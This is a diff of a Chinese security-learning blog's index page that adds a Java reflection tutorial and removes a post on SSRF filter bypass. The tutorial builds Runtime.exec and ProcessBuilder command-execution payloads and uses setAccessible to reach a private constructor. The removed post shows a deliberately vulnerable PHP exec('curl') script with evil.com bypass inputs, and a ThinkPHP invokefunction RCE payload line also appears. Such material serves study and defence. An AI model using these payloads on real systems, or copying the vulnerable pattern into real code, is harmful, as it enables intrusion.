@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">122</span>
+          <span class="site-state-item-count">123</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,141 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/10/Java/java%E5%8F%8D%E5%B0%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/10/Java/java%E5%8F%8D%E5%B0%84/" class="post-title-link" itemprop="url">反射</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-10 14:45:16 / 修改时间：21:49:22" itemprop="dateCreated datePublished" datetime="2022-07-10T14:45:16+08:00">2022-07-10</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>开始学习java安全，反射肯定是避不开的，虽然很早之前写过一点记录，但还是再学一遍</p>
+<p>Java反射是啥</p>
+<p><code>Java</code>反射就是说，对于任意的一个类，我们都可以通过反射获取这个类中所有的属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制 </p>
+<p>通过<code>Class</code>类对象来获取<code>Student</code>和<code>Teacher</code>类中的成员变量和成员方法，而不是直接通过创建<code>Student</code>和<code>Teacher</code>类对象，这就叫反射 </p>
+<p>利用反射创建类对象</p>
+<p>获取了Class对象，现在可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象。</p>
+<p>使用的方式也特别简单，只需要通过forname方法获取到的class对象中进行newInstance方法创建即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class c = Class.forName(&quot;com.reflect.MethodTest&quot;); // 创建Class对象</span><br><span class="line">Object m1 =  c.newInstance(); // 创建类对象</span><br></pre></td></tr></table></figure>
+
+<p>利用反射机制创建类并执行方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTest &#123;</span><br><span class="line">    public void reflectMethod() &#123;</span><br><span class="line">        System.out.println(&quot;反射测试成功!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;com.reflect.ReflectTest&quot;); // 创建Class对象</span><br><span class="line">            Object m = c.newInstance(); // 创建类实例对象</span><br><span class="line">            Method method = c.getMethod(&quot;reflectMethod&quot;); // 获取reflectMethod方法</span><br><span class="line">            method.invoke(m); // 调用类实例对象方法</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先导入才能使用。而使用forName就不需要，这样对于攻击者来说就十分有利，我们可以加载任意类</p>
+<p>同时，forName()还可以获取内部类</p>
+<p>我们通过forName获得类之后用newInstance()来调用这个类的无参构造函数，但有时这个方法会失败，原因可能是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你使用的类没有无参构造函数</span><br><span class="line">你使用的类构造函数是私有的，而我们并没有权限去调用构造函数</span><br></pre></td></tr></table></figure>
+<p>常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但我们不能直接这样来执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); </span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.newInstance(), &quot;id&quot;);</span><br></pre></td></tr></table></figure>
+<p>因为Runtime类的构造方法是私有的。<br>但还是有方法获取到这个类的，这涉及到单例模式。</p>
+<p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class TrainDB &#123;</span><br><span class="line">	private static TrainDB instance = new TrainDB();</span><br><span class="line">	public static TrainDB getInstance() &#123;</span><br><span class="line">		return instance;</span><br><span class="line">	&#125;</span><br><span class="line">    private TrainDB() &#123;</span><br><span class="line">		// 建立连接的代码...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后获取这个类的方法为getInstance。</p>
+<p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime对象。将上述Payload进行修改即可正常执行命令了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); </span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz), &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
+<p>Runtime.exec有6个重载，第一个重载，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。<br>invoke 的作用是执行方法，它的第一个参数是：</p>
+<p>1.如果这个方法是一个普通方法，那么第一个参数是类对象</p>
+<p>2.如果这个方法是一个静态方法，那么第一个参数是类</p>
+<p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。</p>
+<p>所以我们将上述命令执行的Payload分解一下就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);//获取getRuntime方法</span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);//执行getRuntime方法获取Runtime对象</span><br><span class="line">execMethod.invoke(runtime, &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>解决两个问题</p>
+<p>1.如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</p>
+<p>2.如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
+<p>那么我们可以尝试获取构造器来实例化类</p>
+<p>第一个问题</p>
+<p>这里要引入新的反射方法 getConstructor</p>
+<p>和 getMethod 类似，getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p>
+<p>获取到构造函数后，我们使用 newInstance 来执行。</p>
+<p>ProcessBuilder有两个构造函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.public ProcessBuilder(List&lt;String&gt; command)</span><br><span class="line">2.public ProcessBuilder(String... command)</span><br></pre></td></tr></table></figure>
+<p>比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();</span><br></pre></td></tr></table></figure>
+<p>上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。<br>但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表 达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。</p>
+<p>其实用的就是前面讲过的知识：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance( Arrays.asList(&quot;calc.exe&quot;)));</span><br></pre></td></tr></table></figure>
+<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。<br>那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反 射执行呢？</p>
+<p>这又涉及到Java里的可变长参数了。正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。</p>
+<p>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价 的（也就不能重载）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void hello(String[] names) &#123;&#125;</span><br><span class="line">public void hello(String...names) &#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。<br>所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz.getConstructor(String[].class);</span><br></pre></td></tr></table></figure>
+<p>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>
+<p>第二个问题<br>这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：</p>
+<p>1.getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</p>
+<p>2.getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</p>
+<p>举个例子，前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(true);</span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1315,113 +1450,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:/?s=/index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>
 
 <h1 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h1>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/30/PHP/SSRF%E7%9A%84trick/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/30/PHP/SSRF%E7%9A%84trick/" class="post-title-link" itemprop="url">SSRF的trick</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-30 17:34:19 / 修改时间：17:37:23" itemprop="dateCreated datePublished" datetime="2022-06-30T17:34:19+08:00">2022-06-30</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>测试代码:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo &quot;Argument: &quot;.$argv[1].&quot;n&quot;;</span><br><span class="line">   // check if argument is a valid URL</span><br><span class="line">   if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      // parse URL</span><br><span class="line">      $r = parse_url($argv[1]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      // check if host ends with google.com</span><br><span class="line">      if(preg_match(&#x27;/google.com$/&#x27;, $r[&#x27;host&#x27;])) &#123;</span><br><span class="line">         // get page from URL</span><br><span class="line">         exec(&#x27;curl -v -s &quot;&#x27;.$r[&#x27;host&#x27;].&#x27;&quot;&#x27;, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>代码从输入的第一个参数获取url,然后使用filter_var()来验证url的格式。如果通过检验，parse_url会解析，再使用正则表达式来检查主机名是否以google.com结尾。<br>如果全都通过，最后会通过curl发起一个http请求来获取网页的内容，再打印出内容</p>
-<p>按照代码的预期来说，只能接受google.com的请求，不接受其他目标</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://google.com</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com</span><br></pre></td></tr></table></figure>
-<p>对于普通人来说这确实已经足够安全了，但是我们要继续尝试bypass<br>在上面的代码正则表达用于检验请求主机名是否以google.com结尾。但你熟悉URI语法，你应该明白分号和逗号可能是你利用远程主机上的ssrf的方法</p>
-<p>许多URL方案中都有保留字符，保留字符都有特定含义。它们在URL的方案特定部分中的外观具有指定的语义。如果在一个方案中保留了与八位组相对应的字符，则该八位组必须被编码。除了字符“;”, “/”, “?”, “:”, “@”, “=” 和 “&amp;” 被定义为保留字符，其余一律为不保留字符。</p>
-<p>除了分层路径中的dot-segments之外，一般语法认为路径段不透明。 生成应用程序的URI通常使用段中允许的保留字符来分隔scheme-specific或者dereference-handler-specific子组件。 例如分号(“；”) 和等于(“=”) 保留字符通常用于分隔适用于该段的参数和参数值。 逗号(“，”) 保留字符通常用于类似目的。</p>
-<p>例如，一个URI生产者可能使用一个段name;v=1.1来表示对“name”版本1.1的引用，而另一个可能使用诸如“name，1.1”的段来表示相同含义。参数类型可以由scheme-specific 语义来定义，但在大多数情况下，一个参数的语法是特定的URI引用算法的实现。</p>
-<p>若应用于主机evil.com;google.com可能会被curl 或者wget 解析成hostname: evil.com 和 querystring: google.com，不如来试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com;google.com</span><br></pre></td></tr></table></figure>
-
-
-<p>函数filter_var()可以解析许多类型的 URL schema，从上面可以看出filter_var()拒绝以主机名和“HTTP”作为schema验证请求的URL，但如果把 schema从http:// 改成别的会怎样呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com;google.com</span><br></pre></td></tr></table></figure>
-
-<p>成功bypass，但是curl请求失败了，尝试下其他语法不让google.com被解析成主机的一部分。比如说增加端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com:80;google.com:80/</span><br></pre></td></tr></table></figure>
-
-<p>成功访问网站，使用逗号尝试下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com:80,google.com:80/</span><br></pre></td></tr></table></figure>
-
-
-<p>对于parse_url来说，parse_url()是用于解析一个 URL 并返回一个包含在 URL 中出现的各种组成部分关联数组的PHP函数。这个函数并不是要验证给定的URL，它只是将它分解成上面列出的部分。 部分网址也可以作为parse_url()的输入并被尽可能的正确解析，最后的执行命令成功与否要看bash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil$google.com</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash将$google分析为一个空变量，并且使用curl请求了evil &lt;empty&gt; .com，实际就是evil.com.但是这样只能发生在curl语法里，在parse_url解析的主机名仍然是evil$google.com。 $ google变量并没有被解释。 只有当使用了exec()函数而且脚本又使用$r[‘host’]来创建一个curl HTTP请求时，Bash才会将其转换为一个空变量。</span><br></pre></td></tr></table></figure>
-
-<p>这里也可以尝试xss</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo &quot;Argument: &quot;.$argv[1].&quot;n&quot;;</span><br><span class="line">   // check if argument is a valid URL</span><br><span class="line">   if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      // parse URL</span><br><span class="line">      $r = parse_url($argv[1]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      // check if host ends with google.com</span><br><span class="line">      if(preg_match(&#x27;/google.com$/&#x27;, $r[&#x27;host&#x27;])) &#123;</span><br><span class="line">         // get page from URL</span><br><span class="line">         $a = file_get_contents($argv[1]);</span><br><span class="line">         echo($a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这里把exec换成了file_get_contents调用curl，这里尝试在url里加入一些文本来修改响应主体</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,SSBsb3ZlIFBIUAo=google.com //I Love PHP</span><br></pre></td></tr></table></figure>
-
-<p>parse_url()不允许将文本设置为请求主机，并且返回了“not allowed host”正确拒绝解析。我们可以尝试将某些东西注入URI的MIME类型部分</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</span><br></pre></td></tr></table></figure>
-
-<p>成功解析了，接下来尝试xss</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text.google.com/plain;base64,&lt;...b64...&gt;</span><br></pre></td></tr></table></figure>
-
-
-
       
     </div>
 
